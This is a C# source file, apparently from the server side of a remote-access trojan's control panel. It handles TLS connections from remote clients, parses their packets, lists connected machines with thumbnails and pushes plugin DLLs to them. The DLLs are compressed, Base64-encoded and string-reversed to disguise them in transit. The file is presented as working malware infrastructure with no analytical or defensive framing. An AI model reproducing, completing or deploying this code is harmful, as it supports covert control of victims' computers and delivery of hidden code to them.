using System;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Server.Handle_Packet;
using System.Drawing;
using System.Diagnostics;
using System.Threading;
using Server.MessagePack;
using System.Net.Security;
using System.Security.Authentication;
using Server.Algorithm;
using Microsoft.VisualBasic;
using System.Collections.Generic;

namespace Server.Connection
{
    public class Clients
    {
        public Socket TcpClient { get; set; }
        public SslStream SslClient { get; set; }
        public ListViewItem LV { get; set; }
        public ListViewItem LV2 { get; set; }
        public string ID { get; set; }
        private byte[] ClientBuffer { get; set; }
        private const int HeaderSize = 4;
        private int ClientBuffersize { get; set; }
        private bool ClientBufferRecevied { get; set; }
        private MemoryStream ClientMS { get; set; }
        public object SendSync { get; set; }
        public long BytesRecevied { get; set; }

        public Clients(Socket socket)
        {
            SendSync = new object();
            TcpClient = socket;
            SslClient = new SslStream(new NetworkStream(TcpClient, true), false);
            SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, EndAuthenticate, null);
        }

        private void EndAuthenticate(IAsyncResult ar)
        {
            try
            {
                SslClient.EndAuthenticateAsServer(ar);
                ClientBuffer = new byte[HeaderSize];
                ClientMS = new MemoryStream();
                SslClient.BeginRead(ClientBuffer, 0, ClientBuffer.Length, ReadClientData, null);
            }
            catch
            {
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
        }

        public void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!TcpClient.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int Recevied = SslClient.EndRead(ar);
                    if (Recevied > 0)
                    {
                        switch (ClientBufferRecevied)
                        {
                            case false:
                                {
                                    ClientMS.Write(ClientBuffer, 0, Recevied);
                                    if (ClientMS.Length == HeaderSize)
                                    {
                                        ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
                                        ClientMS.Dispose();
                                        ClientMS = new MemoryStream();
                                        if (ClientBuffersize > 0)
                                        {
                                            ClientBuffer = new byte[ClientBuffersize];
                                            Debug.WriteLine("/// Server Buffersize " + ClientBuffersize.ToString() + " Bytes  ///");
                                            ClientBufferRecevied = true;
                                        }
                                    }
                                    break;
                                }

                            case true:
                                {
                                    ClientMS.Write(ClientBuffer, 0, Recevied);
                                    lock (Settings.LockReceivedSendValue)
                                        Settings.ReceivedValue += Recevied;
                                    BytesRecevied += Recevied;
                                    if (ClientMS.Length == ClientBuffersize)
                                    {

                                        ThreadPool.QueueUserWorkItem(new Packet
                                        {
                                            client = this,
                                            data = ClientMS.ToArray(),
                                        }.Read, null);

                                        ClientBuffer = new byte[HeaderSize];
                                        ClientMS.Dispose();
                                        ClientMS = new MemoryStream();
                                        ClientBufferRecevied = false;
                                    }
                                    break;
                                }
                        }
                        SslClient.BeginRead(ClientBuffer, 0, ClientBuffer.Length, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {
            if (LV != null)
            {
                Program.form1.Invoke((MethodInvoker)(() =>
                {
                    try
                    {

                        lock (Settings.LockListviewClients)
                            LV.Remove();

                        if (LV2 != null)
                        {
                            lock (Settings.LockListviewThumb)
                                LV2.Remove();
                        }
                    }
                    catch { }
                    new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} disconnected", Color.Red);
                }));
            }

            try
            {
                SslClient?.Dispose();
                TcpClient?.Dispose();
                ClientMS?.Dispose();
            }
            catch { }
        }

        public void Send(object msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!TcpClient.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    if ((byte[])msg == null) return;
                    byte[] buffer = (byte[])msg;
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (buffer.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        int chunkSize = 50 * 1024;
                        byte[] chunk = new byte[chunkSize];
                        using (MemoryStream buffereReader = new MemoryStream(buffer))
                        using (BinaryReader binaryReader = new BinaryReader(buffereReader))
                        {
                            int bytesToRead = (int)buffereReader.Length;
                            do
                            {
                                chunk = binaryReader.ReadBytes(chunkSize);
                                bytesToRead -= chunkSize;
                                SslClient.Write(chunk, 0, chunk.Length);
                                SslClient.Flush();
                                lock (Settings.LockReceivedSendValue)
                                    Settings.SentValue += chunk.Length;
                            } while (bytesToRead > 0);
                        }
                    }
                    else
                    {
                        SslClient.Write(buffer, 0, buffer.Length);
                        SslClient.Flush();
                        lock (Settings.LockReceivedSendValue)
                            Settings.SentValue += buffer.Length;
                    }
                    Debug.WriteLine("/// Server Sent " + buffer.Length.ToString() + " Bytes  ///");
                }
                catch
                {
                    Disconnected();
                    return;
                }
            }
        }

        public void SendPlugin(string hash) // client is missing some plguins, sending them // total plugins = 550kb
        {
            try
            {
                foreach (string plugin in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
                {
                    if (hash == GetHash.GetChecksum(plugin))
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
                        msgPack.ForcePathObject("Dll").SetAsString(Strings.StrReverse(Convert.ToBase64String(Zip.Compress(File.ReadAllBytes(plugin)))));
                        msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(plugin));
                        ThreadPool.QueueUserWorkItem(Send, msgPack.Encode2Bytes());
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {ex.Message}", Color.Red);
            }
        }
    }
}
